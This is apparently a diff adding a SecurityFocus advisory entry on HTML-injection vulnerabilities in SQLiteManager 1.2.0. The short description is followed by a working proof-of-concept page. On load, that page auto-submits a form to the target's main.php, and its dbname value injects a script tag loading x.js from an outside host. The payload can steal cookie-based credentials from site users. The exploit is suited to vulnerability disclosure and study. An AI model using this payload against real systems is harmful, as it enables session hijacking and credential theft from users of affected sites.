@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/22731/info
+
+SQLiteManager is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data.
+
+Exploiting these issues may allow an attacker to execute HTML and script code in the context of the affected site, to steal cookie-based authentication credentials, or to control how the site is rendered to the user; other attacks are also possible.
+
+Version 1.2.0 is vulnerable; other versions may also be affected. 
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html> <head> <body> <form id="editform" name="editform" method="post" action="http://www.example.com/sqlitemanager/main.php" enctype="multipart/form-data"> <input type="text" name="dbname" value='"><script src=http://www.0x000000.com/x.js></script><"' /> <input type="text" name="dbVersion" value="2" /> <input type="text" name="dbRealpath" value="" /> <input type="text" name="filename" value="" /> <input type="text" name="dbpath" value="" /> <input type="text" name="action" value="saveDb" /> <input name="Save" value="Save page" type="submit"> </form> <script>document.forms[0].submit();</script> </body> </html> 
